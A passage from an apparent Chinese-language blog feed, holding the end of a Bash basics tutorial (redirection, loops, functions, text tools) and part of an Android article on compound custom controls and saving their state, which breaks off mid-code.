会以累加的方式输出文件中。</span><br><span class="line">python hello<span class="selector-class">.py</span> &gt;&gt; <span class="string">"output.out"</span> <span class="number">2</span>&gt;&gt; <span class="string">"error.err"</span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="覆盖-output-out-追加-error-err-并统计行数">覆盖 output.out , 追加 error.err 并统计行数</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">info bash <span class="string">'Basic Shell Features'</span> <span class="string">'Redirections'</span> &gt; output<span class="selector-class">.out</span> <span class="number">2</span>&gt;&gt; error.err</span><br><span class="line">wc -l output<span class="selector-class">.out</span> error.err</span><br></pre>      </td>    </tr>  </table></figure><h2 id="运行指令并打印文件描述符-比如-dev-fd-123">运行指令并打印文件描述符 （比如 /dev/fd/123）</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line"># 具体可查看： man fd</span><br><span class="line">echo &lt;(echo <span class="string">"#helloworld"</span>)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="以-helloworld-覆盖-output-out">以 “#helloworld” 覆盖 output.out</h2><figure class="highlight">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">cat &gt; output<span class="selector-class">.out</span> &lt;(echo <span class="string">"#helloworld"</span>)</span><br><span class="line">echo <span class="string">"#helloworld"</span> &gt; output.out</span><br><span class="line">echo "#helloworld" | cat &gt; output.out</span><br><span class="line">echo "#helloworld" | tee output.out &gt;/dev/null</span><br></pre>      </td>    </tr>  </table></figure><h2 id="清理临时文件并显示详情-增加-i-选项启用交互模式">清理临时文件并显示详情（增加 ‘-i’ 选项启用交互模式）</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">rm -v output<span class="selector-class">.out</span> error<span class="selector-class">.err</span> output-and-error.log</span><br></pre>      </td>    </tr>  </table></figure><h2 id="一个指令可用-嵌套在另一个指令内部">一个指令可用 $( ) 嵌套在另一个指令内部</h2><h3 id="以下的指令会打印当前目录下的目录和文件总数">以下的指令会打印当前目录下的目录和文件总数</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">echo &quot;There are $(ls | wc -l) items here.&quot;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="反引号-起相同作用-但不允许嵌套">反引号 `` 起相同作用，但不允许嵌套</h3><p><strong><em>优先使用 $()</em></strong></p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">echo &quot;There are `ls | wc -l` items here.&quot;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="bash-的-case-语句与-java-和-c-中的-switch-语句类似">Bash 的 case 语句与 Java 和 C++ 中的 switch 语句类似</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">case <span class="string">"$Variable"</span> <span class="keyword">in</span></span><br><span class="line">    # 列出需要匹配的字符串</span><br><span class="line">    0) echo "There is a zero.";;</span><br><span class="line">    1) echo "There is a one.";;</span><br><span class="line">    *) echo "It is not null.";;</span><br><span class="line">esac</span><br></pre>      </td>    </tr>  </table></figure><h2 id="循环遍历给定的参数序列">循环遍历给定的参数序列</h2><h3 id="变量-variable-的值会被打印-3-次">变量$Variable 的值会被打印 3 次</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">for</span> Variable <span class="keyword">in</span> &#123;<span class="number">1</span>..<span class="number">3</span>&#125;</span><br><span class="line">do</span><br><span class="line">    echo <span class="string">"$Variable"</span></span><br><span class="line">done</span><br></pre>      </td>    </tr>  </table></figure><h3 id="或传统的-for循环">或传统的 “for循环”</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">for ((a=1; a &lt;= 3; a++))</span><br><span class="line">do</span><br><span class="line">    echo <span class="variable">$a</span></span><br><span class="line">done</span><br></pre>      </td>    </tr>  </table></figure><p><strong><em>也可以用于文件</em></strong></p><h3 id="用-cat-输出-file1-和-file2-内容">用 cat 输出 file1 和 file2 内容</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">for</span> Variable <span class="keyword">in</span> file1 file2</span><br><span class="line">do</span><br><span class="line">    cat <span class="string">"$Variable"</span></span><br><span class="line">done</span><br></pre>      </td>    </tr>  </table></figure><p><strong><em>或作用于其他命令的输出</em></strong></p><h3 id="对-ls-输出的文件执行-cat-指令">对 ls 输出的文件执行 cat 指令</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">for</span> Output <span class="keyword">in</span> $(ls)</span><br><span class="line">do</span><br><span class="line">    cat <span class="string">"$Output"</span></span><br><span class="line">done</span><br></pre>      </td>    </tr>  </table></figure><h3 id="while-循环">while 循环</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">while [ true ]</span><br><span class="line">do</span><br><span class="line">    echo <span class="string">"loop body here..."</span></span><br><span class="line">    break</span><br><span class="line">done</span><br></pre>      </td>    </tr>  </table></figure><h2 id="你也可以使用函数">你也可以使用函数</h2><h3 id="定义函数">定义函数</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">function foo ()</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">"Arguments work just like script arguments: $@"</span></span><br><span class="line">    echo <span class="string">"And: $1 $2..."</span></span><br><span class="line">    echo <span class="string">"This is a function"</span></span><br><span class="line">    return <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="更简单的方法">更简单的方法</h3><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">bar ()</span><br><span class="line">&#123;</span><br><span class="line">    echo <span class="string">"Another way to declare functions!"</span></span><br><span class="line">    return <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="调用函数">调用函数</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">foo &quot;My name is&quot; $Name</span><br></pre>      </td>    </tr>  </table></figure><h2 id="有很多有用的指令需要学习">有很多有用的指令需要学习</h2><h3 id="打印-file-txt-的最后-10-行">打印 file.txt 的最后 10 行</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">tail -n 10 file.txt</span><br></pre>      </td>    </tr>  </table></figure><h3 id="打印-file-txt-的前-10-行">打印 file.txt 的前 10 行</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">head -n 10 file.txt</span><br></pre>      </td>    </tr>  </table></figure><h3 id="将-file-txt-按行排序">将 file.txt 按行排序</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sort file.txt</span><br></pre>      </td>    </tr>  </table></figure><h3 id="报告或忽略重复的行-用选项-d-打印重复的行">报告或忽略重复的行，用选项 -d 打印重复的行</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">uniq -d file.txt</span><br></pre>      </td>    </tr>  </table></figure><h3 id="打印每行中-之前内容">打印每行中 ‘,’ 之前内容</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">cut -d &apos;,&apos; -f 1 file.txt</span><br></pre>      </td>    </tr>  </table></figure><h3 id="将-file-txt-文件所有-okay-替换为-great-兼容正则表达式">将 file.txt 文件所有 ‘okay’ 替换为 ‘great’, （兼容正则表达式）</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sed -i &apos;s/okay/great/g&apos; file.txt</span><br></pre>      </td>    </tr>  </table></figure><h3 id="将-file-txt-中匹配正则的行打印到标准输出">将 file.txt 中匹配正则的行打印到标准输出</h3><p>这里打印以 “foo” 开头, “bar” 结尾的行</p><figure class="highlight plain">  <figcaption><span>"^foo.*bar$" file.txt```</span></figcaption>  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">使用选项 &quot;-c&quot; 统计行数</span><br><span class="line"></span><br><span class="line">```grep -c &quot;^foo.*bar$&quot; file.txt</span><br></pre>      </td>    </tr>  </table></figure><h3 id="如果只是要按字面形式搜索字符串而不是按正则表达式-使用-fgrep-或-grep-f">如果只是要按字面形式搜索字符串而不是按正则表达式，使用 fgrep (或 grep -F)</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">fgrep &quot;^foo.*bar$&quot; file.txt</span><br></pre>      </td>    </tr>  </table></figure><h2 id="以-bash-内建的-help-指令阅读-bash-自带文档">以 bash 内建的 ‘help’ 指令阅读 Bash 自带文档</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">help</span><br><span class="line">help help</span><br><span class="line">help <span class="keyword">for</span></span><br><span class="line">help return</span><br><span class="line">help source</span><br><span class="line">help .</span><br></pre>      </td>    </tr>  </table></figure><h2 id="用-man-指令阅读相关的-bash-手册">用 man 指令阅读相关的 Bash 手册</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">apropos bash</span><br><span class="line">man <span class="number">1</span> bash</span><br><span class="line">man bash</span><br></pre>      </td>    </tr>  </table></figure><h2 id="用-info-指令查阅命令的-info-文档-info-中按-显示帮助信息">用 info 指令查阅命令的 info 文档 （info 中按 ? 显示帮助信息）</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">apropos info | grep '^info.*('</span><br><span class="line">man info</span><br><span class="line">info info</span><br><span class="line">info <span class="number">5</span> info</span><br></pre>      </td>    </tr>  </table></figure><h2 id="阅读-bash-的-info-文档">阅读 Bash 的 info 文档</h2><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">info bash</span><br><span class="line">info bash <span class="string">'Bash Features'</span></span><br><span class="line">info bash <span class="number">6</span></span><br><span class="line">info --apropos bash</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/19f2d195/">http://home.meng.uno/articles/19f2d195/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      显示 “Hello world!”
echo Hello world!

每一句指令以换行或分号隔开：
echo ‘This is the first line’; echo ‘This is the second line’

声明一个变量：
Variable=“Some string”

***这是错误的做法：***Variable = “Some string”

***原因：***Bash 会把 Variable 当做一个指令，由于找不到该指令，因此这里会报错。

***也不可以这样：***Variable= ‘Some string’

***原因：***Bash 会认为 ‘Some
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="Shell" scheme="http://home.meng.uno/tags/Shell/"/>
    
      <category term="Bash" scheme="http://home.meng.uno/tags/Bash/"/>
    
  </entry>
  
  <entry>
    <title>Android自定义组合控件</title>
    <link href="http://home.meng.uno/articles/db293350/"/>
    <id>http://home.meng.uno/articles/db293350/</id>
    <published>2016-11-29T04:04:15.000Z</published>
    <updated>2020-12-02T01:40:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1>概论：</h1><ol>  <li>说在前面的话</li>  <li>继承框架提供的布局</li>  <li>布局文件</li>  <li>构造方法</li>  <li>状态保存</li></ol><h2 id="说在前面的话">说在前面的话</h2><p><em>自定义组合控件还是蛮简单的，你不用measure，layout，draw，当然你想的话也可以在组合控件上做这些操作的，不过大多数时候是没有必要的。组合控件的自定义属性和自定义view完全一样，这里比较难的是状态保存，因为一个页面可以有很多个你自定义的组合控件，但是系统的状态保存是依赖viewID的，所以你不能让ViewGroup来管理你的控件状态，只能自己管理了。当然，你也可能不需要状态保存，那就很简单了。</em></p><p><strong>下面说说需要经历的步骤吧：</strong></p><ul>  <li>让自定义的组合控件继承框架提供的布局，如<code>LinearLayout</code>,<code>RelativeLayout</code>等。</li>  <li>把你组合控件里面的子控件放到一个布局文件中，然后在组合控件的构造方法中加载进来。</li>  <li>采用<code>merge</code>作为你布局文件的根，这样可以减少嵌套层次。</li>  <li>接下来是比较难的状态保存。</li>  <li>自定义属性，这个和自定义view一样。</li></ul><h2 id="继承框架提供的布局">继承框架提供的布局</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CompoundControl</span><span class="keyword">extends</span> <span class="title">LinearLayout</span><span class="keyword">implements</span> <span class="title">android</span>.<span class="title">view</span>.<span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;...</span><br></pre>      </td>    </tr>  </table></figure><p>## 布局文件 样例如下：</p><figure class="highlight xml">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">merge</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"fill_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TextView</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">android:id</span>=<span class="string">"@+id/fromDate"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Enter From Date"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_weight</span>=<span class="string">"70"</span> </span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">android:id</span>=<span class="string">"@+id/fromButton"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Go"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_weight</span>=<span class="string">"30"</span> </span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span>        </span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"fill_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">TextView</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">android:id</span>=<span class="string">"@+id/toDate"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Enter To Date"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_weight</span>=<span class="string">"70"</span> </span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">android:id</span>=<span class="string">"@+id/toButton"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"0dp"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Go"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_weight</span>=<span class="string">"30"</span> </span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span>        </span><br><span class="line"><span class="tag">&lt;/<span class="name">merge</span>&gt;</span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="构造方法">构造方法</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DurationControl</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(context);</span><br><span class="line">initialize(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DurationControl</span><span class="params">(Context context, AttributeSet attrs, <span class="keyword">int</span> defStyle)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(context, attrs, defStyle);</span><br><span class="line">TypedArray t = context.obtainStyledAttributes(attrs,</span><br><span class="line">R.styleable.DurationComponent, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">durationUnits = t.getInt(R.styleable.DurationComponent_durationUnits,</span><br><span class="line">durationUnits);</span><br><span class="line">t.recycle();</span><br><span class="line">initialize(context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DurationControl</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>(context, attrs, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">LayoutInflater lif = (LayoutInflater) context</span><br><span class="line">.getSystemService(Context.LAYOUT_INFLATER_SERVICE);</span><br><span class="line">lif.inflate(R.layout.duration_view_layout, <span class="keyword">this</span>);</span><br><span class="line">Button b = (Button) <span class="keyword">this</span>.findViewById(R.id.fromButton);</span><br><span class="line">b.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">b = (Button) <span class="keyword">this</span>.findViewById(R.id.toButton);</span><br><span class="line">b.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.setSaveEnabled(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="状态保存">状态保存</h2><p><em>前面说过了，由于你控件可能会在一个页面出现多次，所以viewID会重复，这样系统就没办法帮你管理状态了。所以如果你要管理children的状态，就必须亲自动手了，而不是让children自己管理自己的状态。</em></p><p>要想管理children的状态，你必须要知道ViewGroup的四个状态管理的方法，他们是：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">dispatchSaveInstanceStatedispatchFreezeSelfOnlydispatchRestoreInstanceStatedispatchThawSelfOnly</span><br></pre>      </td>    </tr>  </table></figure><p>&gt; A ViewGroup uses dispatchSaveInstanceState to first save its own state by calling super (view’s) dispatchSaveInstanceState, which in turn triggers onSaveInstanceState on itself and then calls the dispatchSaveInstanceState for each of its children.  If the children are plain views and not ViewGroups, this will result in having their onSaveInstanceState called. Listing 2-12 presents the pseudo code for how these key methods are meshed together. ```java ViewGroup.dispatchSaveInstanceState() { View.dispatchSaveInstanceState()  …ends up calling its own ViewGroup.onSaveInstanceState() Children.dispatchSaveInstanceState() …ends up calling children’s onSaveInstanceState() } View.dispatchSaveInstanceState() { onSaveInstanceState() } ViewGroup.dispatchFreezeSelfOnly() { View.dispatchSaveInstanceState()  …ends up calling ViewGroup.onSaveInstanceState() }</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"></span><br><span class="line">技巧在于`dispatchFreezeSelfOnly`,这个ViewGroup方法只是简单的保存了ViewGroup的状态，这同样也发生在对应的恢复`dispatchThawSelfOnly`上。所以你可以重写ViewGroup的方法来阻止children自己管理状态。如下所示：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">@Overrideprotected void dispatchSaveInstanceState(SparseArray&lt;Parcelable&gt; container)&#123;  //Don&apos;t call this so that children won&apos;t be explicitly saved  //super.dispatchSaveInstanceState(container);  //Call your self onsavedinstancestate  super.dispatchFreezeSelfOnly(container);&#125;</span><br><span class="line">@Overrideprotected void dispatchRestoreInstanceState(   SparseArray&lt;Parcelable&gt; container)&#123;  //Don&apos;t call this so that children won&apos;t be explicitly saved  //super.dispatchRestoreInstanceState(container);  super.dispatchThawSelfOnly(container);&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>接下来就需要ViewGroup在<code>onSaveInstanceState</code> 和 <code>onRestoreInstanceState</code>中管理children的状态了，实例代码如下：  <figure class="highlight java">    <table>      <tr>        <td class="gutter">          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre>        </td>        <td class="code">          <pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">dispatchSaveInstanceState</span><span class="params">(SparseArray&lt;Parcelable&gt; container)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Don't call this so that children won't be explicitly saved</span></span><br><span class="line"><span class="comment">// super.dispatchSaveInstanceState(container);</span></span><br><span class="line"><span class="comment">// Call your self onsavedinstancestate</span></span><br><span class="line"><span class="keyword">super</span>.dispatchFreezeSelfOnly(container);</span><br><span class="line">Log.d(tag, <span class="string">"in dispatchSaveInstanceState"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">dispatchRestoreInstanceState</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">SparseArray&lt;Parcelable&gt; container)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Don't call this so that children won't be explicitly saved</span></span><br><span class="line"><span class="comment">// .super.dispatchRestoreInstanceState(container);</span></span><br><span class="line"><span class="keyword">super</span>.dispatchThawSelfOnly(container);</span><br><span class="line">Log.d(tag, <span class="string">"in dispatchRestoreInstanceState"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRestoreInstanceState</span><span class="params">(Parcelable state)</span> </span>&#123;</span><br><span class="line">Log.d(tag, <span class="string">"in onRestoreInstanceState"</span>);</span><br><span class="line"><span 